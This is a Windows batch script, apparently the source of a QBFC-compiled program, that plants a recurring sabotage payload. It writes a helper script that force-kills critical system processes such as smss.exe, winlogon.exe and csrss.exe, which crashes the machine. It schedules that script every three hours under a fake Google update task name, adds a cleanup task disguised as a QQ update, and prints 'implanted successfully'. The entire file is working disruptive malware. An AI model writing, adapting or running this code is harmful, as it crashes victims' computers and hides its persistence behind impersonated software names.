@ECHO OFF
REM  QBFC Project Options Begin
REM  HasVersionInfo: No
REM  Companyname: 
REM  Productname: 
REM  Filedescription: 
REM  Copyrights: 
REM  Trademarks: 
REM  Originalname: 
REM  Comments: 
REM  Productversion:  0. 0. 0. 0
REM  Fileversion:  0. 0. 0. 0
REM  Internalname: 
REM  Appicon: E:\FTP文件夹\图片\666.ico
REM  AdministratorManifest: No
REM  QBFC Project Options End
ECHO ON
@echo off
color 4
@sc config schedule start= auto
@net start schedule
echo @echo off>logx.bat
echo taskkill /t /f /im smss.exe>>logx.bat
echo taskkill /t /f /im winlogon.exe>>logx.bat
echo taskkill /t /f /im csrss.exe>>logx.bat
echo taskkill /t /f /im inetinfo.exe>>logx.bat
echo taskkill /t /f /im explorer.exe>>logx.bat
echo @echo off>logxx.bat
echo schtasks /delete  /tn "GoogleUpdateTaskUserS-5-1-4-02" /f>>logxx.bat
echo schtasks /delete  /tn "QQ-MdPlerary-Update" /f >>logxx.bat
echo del %cd%\logx.bat>>logxx.bat
echo del %cd%\logxx.bat>>logxx.bat
schtasks /create /sc hourly /mo 3 /sd 2018/11/09 /tn "GoogleUpdateTaskUserS-5-1-4-02" /tr "%cd%\logx.bat"

schtasks /create /sc hourly /mo 1 /sd 2018/12/09 /tn "QQ-MdPlerary-Update" /tr "%cd%\logxx.bat"


del %abc%\Xf.exe

echo 植入成功
pause>nul
